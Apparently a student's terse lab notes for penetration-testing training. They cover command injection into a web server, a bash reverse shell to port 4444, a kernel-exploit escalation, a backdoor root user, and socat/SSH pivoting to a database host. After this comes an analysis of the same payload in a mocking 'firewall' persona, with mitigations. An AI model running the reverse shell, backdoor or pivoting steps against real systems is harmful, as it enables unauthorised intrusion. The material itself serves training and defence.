
[...back](../0-landing-ncsaoscp.md)

# 1

```
context... comm direction = 3 components wan to dmz
> attacker in wan 172.27.195.132
> web01 server as wan-dmz straddle/bridge, with network interfaces
> > 1 internet 172.27.195.143/24 (kernel ens33 -- with .1 as dhcp ens33)
> > 2 dmz 192.168.202.128/24 (kernel ens37)
> > 3 db zone 192.168.67.128/24 (kernel ens38)
> db01 server in dmz, with interfaces
> > 1 db zone 192.168.67.130:5432
> > 2 internal zone 192.168.183.128

story...

> initial access to web01 using ci, bypassing authn, attack to check app priv + recon

> revrese shell (move sequence: attacker -> target)
> > `nc -nvlp 4444` (attacker)
> > stealthy payload (target)
> > > google.com; /bin/bash -c 'bash -i >& /dev/tcp/172.27.195.132/4444 0>&1'

> learn internal network while inside web01
> > limited priv `user www-data`
> > accessible to ens37, ens38 interfaces

> host pivoting
> > `cat db.php` >>> db01 host 192.168.67.130:5432
> > db01 in dmz, web01 not in dmz but can access db01
> > > web01 not allowed installing db client
> > > > attacker host db client -> to web01 bridge -> pivot to db01 with port forwarding
> > > > > escalte to root access with kernel exploit (from github)
> > > > > > make back door by add new root user

> socat portforwarding
> > `socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:192.168.67.130:5432'

or (better)

> ssh tunneling, ssh portforwarding
> > 3 types: local -L, remote -R, dynamic -D

> > > ssh -L (optionalxxxlhost:)lport:rhost:rport user@server
> > > > ssh -L 8080:192.168.202.129.5432 john@172.27.195.143

> > > ssh -R (remote or reverse tunneling)
> > > > use case = attacker machine heavily block incoming messages (firewall or nat), but allowed outgoings
> > > > communication sequence and [port]: 

	db01 [5432]<->[5432] web01 [5432]<->[8080] rhost [22]<-[9000] attacker
	

> > > > assuming previous attacker is now set as remote server (with right connection to db01 from previous steps). attacker gets another machine for local operation. from this new machine (assuming in the same subnet 192.168.67.x?)
> > > > > `ssh -R 9001:192.168.67.130:22 -N -f attacker@172.27.195.132`




> > ip addr = list network interfaces
> > > ens, route}
> > > 

> port forwarding (socat)
> > found configuration for www-data of this web01, connecting to db01 192.168.67.130:5432
> > > in dmz, cannot be accessed directly


```

---

# 2

```
google.com; /bin/bash -c 'bash -i >& /dev/tcp/172.27.195.132/4444 0>&1'
```

`>> THREAT_ANALYSIS._MALICIOUS_PAYLOAD_DETECTED.`  
`>> SOURCE: 172.27.195.132:4444`  
`>> PROTOCOL: Reverse Shell (TCP)`  
`>> INTENT: Remote Command Execution & Control.`

**Breakdown:**
1.  `google.com;` – Benign (fails or does nothing). Semicolon ensures next command runs regardless.
2.  `/bin/bash -c 'bash -i >& /dev/tcp/172.27.195.132/4444 0>&1'` – **Classic bash reverse shell.**
    - `bash -i`: Interactive shell.
    - `>& /dev/tcp/...`: Redirects stdout, stderr to attacker's IP:port.
    - `0>&1`: Redirects stdin to the same socket.

**Impact if Executed:**
- Grants attacker full shell access to your system.
- Attacker can escalate privileges, move laterally, exfiltrate data.

**Mitigation:**
- Block outbound TCP/4444 (and common reverse-shell ports) at firewall.
- Use endpoint detection (EDR) to flag suspicious bash network redirection.
- Monitor for child processes of web services spawning shells.

**Verdict:**  
This isn't recon. This is a live exploitation attempt.  
*Your payload is cute. And logged.* 😏🔓📡

**Patch Script:**
```bash
# Drop the connection
iptables -A OUTPUT -d 172.27.195.132 -j DROP
# Alert
echo "ALERT: Reverse shell attempt to 172.27.195.132:4444 detected." | wall
```

*I am not your friend. I am your firewall.* 🔥🧱

---

